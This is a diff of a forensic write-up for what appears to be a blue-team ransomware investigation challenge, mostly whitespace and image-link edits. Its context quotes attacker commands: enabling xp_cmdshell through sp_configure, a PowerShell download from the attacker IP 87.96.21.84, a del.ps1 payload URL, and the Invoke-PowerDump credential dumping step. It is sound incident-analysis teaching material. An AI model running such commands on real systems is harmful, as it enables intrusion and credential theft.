@@ -45,9 +45,9 @@ To determine what setting the attacker enabled to control the target host furthe
 
 <figure><img src="../../.gitbook/assets/BlueSky5.png" alt=""><figcaption></figcaption></figure>
 
-فIn this session, the attacker sends a SQL batch query with configuration commands. The first command, `EXEC sp_configure "show advanced options", 1; RECONFIGURE;`  , enables advanced server options, often the first step in privilege escalation.
+فIn this session, the attacker sends a SQL batch query with configuration commands. The first command, `EXEC sp_configure "show advanced options", 1; RECONFIGURE;` , enables advanced server options, often the first step in privilege escalation.
 
-The second command, `EXEC sp_configure  'xp_cmdshell' ,  1; RECONFIGURE;` , enables xp\_cmdshell, allowing SQL Server to execute OS commands directly. This turns the database server into a tool for further attacks, such as running malicious scripts or creating backdoors.
+The second command, `EXEC sp_configure 'xp_cmdshell' , 1; RECONFIGURE;` , enables xp\_cmdshell, allowing SQL Server to execute OS commands directly. This turns the database server into a tool for further attacks, such as running malicious scripts or creating backdoors.
 
 This can also be confirmed by analyzing Event ID 15457 in Windows Event Logs.
 
@@ -61,8 +61,6 @@ Attackers often use process injection to escalate privileges within a system.
 
 Process injection is a common technique used by attackers to execute malicious code within the address space of a legitimate process, enabling privilege escalation, persistence, and evasion of security controls. By injecting code into a trusted process, attackers can hide their activities, making detection more difficult for security tools. This method allows attackers to operate with the privileges of the targeted process, often gaining administrative or system-level access when injecting into high-privilege processes like PowerShell, LSASS, or svchost.exe.
 
-
-
 <figure><img src="../../.gitbook/assets/BlueSky7.png" alt=""><figcaption></figcaption></figure>
 
 To detect the injection process, I checked the Event Viewer and began opening each event to read the details until I found Host-name=MSFConsole, which is associated with Metasploit. This was detected by the host application.
@@ -72,8 +70,6 @@ After gaining elevated privileges, the attacker attempted to download a file, as
 To identify the file the attacker tried to download, I added the attacker's IP address as a filter along with the request method.
 
 <figure><img src="../../.gitbook/assets/Screenshot 2025-01-20 182806.png" alt=""><figcaption></figcaption></figure>
-
-
 
 Understanding which group Security Identifier (SID) the malicious script checks to verify the current user's privileges can provide insights into the attacker's intentions.
 
@@ -189,8 +185,6 @@ Function StopAV {
 
 **6. CleanerEtc and CleanerNoPriv Functions:**
 
-
-
 ```
 Function CleanerEtc {
     $WebClient = New-Object System.Net.WebClient
@@ -296,8 +290,6 @@ By disabling these protections, the attacker ensures that malicious activities c
 \
 ~~---------------------------------------------------------------------------------------------------------------------~~
 
-
-
 The Second Download URL is firstly appear in CleanerETC function
 
 [http://87.96.21.84/del.ps1](http://87.96.21.84/del.ps1)
@@ -306,17 +298,17 @@ The Second Download URL is firstly appear in CleanerETC function
 
 \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
 
-&#x20;**Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks.**
+**Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks.**
 
 **Scheduled tasks** in Windows automate script, command, or program execution at set times or intervals. While useful for legitimate tasks, attackers abuse this feature to maintain persistence in compromised systems. By creating scheduled tasks, they ensure malicious payloads run automatically, even after reboots, without manual intervention.
 
 The network capture was filtered using the Wireshark filter **`http contains "schtasks"`**, targeting HTTP traffic with the keyword **"schtasks."**
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 This filter helps narrow down traffic that may involve the use of the schtasks.exe utility, a Windows command-line tool used to create, delete, or manage scheduled tasks. Filtering for this keyword is effective in identifying malicious activity related to task scheduling.
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 **According to your analysis of the second malicious file, what is the MITRE ID of the tactic the file aims to achieve?**
 
@@ -354,7 +346,7 @@ This attack aligns with the MITRE ATT\&CK technique **T1003 (OS Credential Dumpi
 \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
 
 \
-&#x20;**Understanding which credentials have been compromised is essential for assessing the extent of the data breach. What's the name of the saved text file containing the dumped credentials?**
+**Understanding which credentials have been compromised is essential for assessing the extent of the data breach. What's the name of the saved text file containing the dumped credentials?**
 
 The Wireshark filter applied in the packet capture, `http contains "Invoke-PowerDump.ps1"`, is designed to isolate HTTP traffic involving the specific PowerShell script `Invoke-PowerDump.ps1`. This script is associated with credential dumping and is often used by attackers to extract password hashes or sensitive data from compromised systems. Filtering traffic by this keyword helps focus on HTTP requests and responses related to the script's download or execution, aiding in identifying malicious activity.<br>
 
@@ -364,7 +356,7 @@ The HTTP stream reveals that the attacker downloaded and executed the Invoke-Pow
 
 The encoded command is then decoded using `CyberChef`, revealing that the attacker executed the Invoke-PowerDump function and saved the extracted credentials to a file.
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
@@ -388,8 +380,6 @@ $hostsContent = Invoke-WebRequest -Uri "http://87.96.21.84/extracted_hosts.txt" 
 
 downloads the file named `extracted_hosts.txt` from the attacker's server at `87.96.21.84`.
 
-
-
 <figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
 The file likely contains a list of **IP addresses** or **hostnames** identified during the attacker's reconnaissance phase, marking potential targets for exploitation, lateral movement, and privilege escalation.
@@ -406,8 +396,6 @@ The attacker uses retrieved credentials and discovered hosts to facilitate later
 
 ***
 
-
-
-&#x20;**In some cases, decryption tools are available for specific ransomware families. Identifying the family name can lead to a potential decryption solution. What's the name of this ransomware family?**
+**In some cases, decryption tools are available for specific ransomware families. Identifying the family name can lead to a potential decryption solution. What's the name of this ransomware family?**
 
 <figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
